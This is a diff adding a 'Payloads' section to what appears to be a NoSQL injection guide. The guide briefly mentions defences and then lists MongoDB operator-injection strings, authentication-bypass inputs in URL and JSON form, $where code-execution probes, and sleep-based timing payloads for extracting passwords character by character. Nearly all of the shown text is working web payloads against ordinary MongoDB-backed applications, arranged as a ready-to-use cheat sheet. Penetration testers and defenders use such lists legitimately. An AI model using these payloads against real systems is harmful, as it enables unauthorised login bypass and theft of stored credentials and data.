@@ -67,8 +67,69 @@ To defend against NoSQL Injection, implement robust input validation, parameteri
 
        `admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'`
 
-#### General Guidelines:
+### General Guidelines:
 
 * **Adaptation**: Customize payloads based on specific application contexts.
 * **Encoding**: Encode payloads as necessary, particularly for URL-based injections.
 * **Validation**: Verify responses for changes/error messages indicating successful exploitation.
+
+### Payloads
+
+* Operator Injection
+
+```mongodb
+username[$ne]=1$password[$ne]=1 #<Not Equals>
+username[$regex]=^adm$password[$ne]=1 #Check a <regular expression>, could be used to brute-force a parameter
+username[$regex]=.{25}&pass[$ne]=1 #Use the <regex> to find the length of a value
+username[$eq]=admin&password[$ne]=1 #<Equals>
+username[$ne]=admin&pass[$lt]=s #<Less than>, Brute-force pass[$lt] to find more users
+username[$ne]=admin&pass[$gt]=s #<Greater Than>
+username[$nin][admin]=admin&username[$nin][test]=test&pass[$ne]=7 #<Matches non of the values of the array> (not test and not admin)
+{ $where: "this.credits == this.debits" }#<IF>, can be used to execute code
+```
+
+* #### Basic authentication bypass <a href="#basic-authentication-bypass" id="basic-authentication-bypass"></a>
+
+```mongodb
+#in URL
+username[$ne]=toto&password[$ne]=toto
+username[$regex]=.*&password[$regex]=.*
+username[$exists]=true&password[$exists]=true
+
+#in JSON
+{"username": {"$ne": null}, "password": {"$ne": null} }
+{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
+{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
+```
+
+* Mongodb Payloads
+
+```mongodb
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+', $where: '1 == 1
+1, $where: '1 == 1'
+{ $ne: 1 }
+', $or: [ {}, { 'a':'a
+' } ], $comment:'successful MongoDB injection'
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+|| 1==1
+|| 1==1//
+|| 1==1%00
+}, { password : /.*/ }
+' && this.password.match(/.*/)//+%00
+' && this.passwordzz.match(/.*/)//+%00
+'%20%26%26%20this.password.match(/.*/)//+%00
+'%20%26%26%20this.passwordzz.match(/.*/)//+%00
+{$gt: ''}
+[$ne]=1
+';sleep(5000);
+';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
+{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
+{"username": {"$gt":""}, "password": {"$gt":""}}
+{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
+```
